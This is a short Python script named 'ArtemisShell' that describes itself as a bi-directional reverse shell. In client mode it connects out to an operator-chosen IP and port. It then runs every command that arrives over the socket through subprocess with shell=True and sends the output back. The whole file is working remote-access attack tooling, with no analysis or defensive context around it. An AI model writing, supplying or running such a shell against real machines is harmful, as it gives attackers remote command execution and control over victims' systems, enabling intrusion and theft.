#!/usr/bin/env python3
# ArtemisShell by blue0x1
#

import argparse
import socket
import subprocess
import sys
import threading

def handle_incoming(sock):
    while True:
        try:
            received_data = sock.recv(1024)
            if received_data:
                command = received_data.decode()
                execution_result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                response = execution_result.stdout + execution_result.stderr
                sock.sendall(response)
        except:
            print('[!] Connection closed.')
            sys.exit(0)

def handle_outgoing(sock):
    while True:
        try:
            command_input = input('> ')
            sock.sendall(command_input.encode())

            received_data = sock.recv(1024)
            if received_data:
                print(received_data.decode(), end='')
        except:
            print('[!] Connection closed.')
            sys.exit(0)

def establish_connection(ip, port, server_mode):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if server_mode:
        listen_address = (ip, port)
        print('[*] Listening on {}:{}'.format(*listen_address))
        sock.bind(listen_address)

        sock.listen(1)

        print('[*] Waiting for a connection...')
        connection, remote_address = sock.accept()
        print('[*] Accepted connection from {}:{}'.format(*remote_address))

        incoming_thread = threading.Thread(target=handle_incoming, args=(connection,))
        outgoing_thread = threading.Thread(target=handle_outgoing, args=(connection,))
    else:
        remote_address = (ip, port)
        print('[*] Connecting to {}:{}'.format(*remote_address))
        sock.connect(remote_address)

        incoming_thread = threading.Thread(target=handle_incoming, args=(sock,))
        outgoing_thread = threading.Thread(target=handle_outgoing, args=(sock,))

    incoming_thread.start()
    outgoing_thread.start()

    incoming_thread.join()
    outgoing_thread.join()

if __name__ == '__main__':
    argument_parser = argparse.ArgumentParser(description='Bi-directional Reverse Shell')
    argument_parser.add_argument('--mode', choices=['server', 'client'], required=True, help='the mode to run')
    argument_parser.add_argument('--ip', required=True, help='the IP address to connect to or listen on')
    argument_parser.add_argument('--port', type=int, required=True, help='the port number to use')

    parsed_args = argument_parser.parse_args()

    server_mode = parsed_args.mode == 'server'
    establish_connection(parsed_args.ip, parsed_args.port, server_mode)
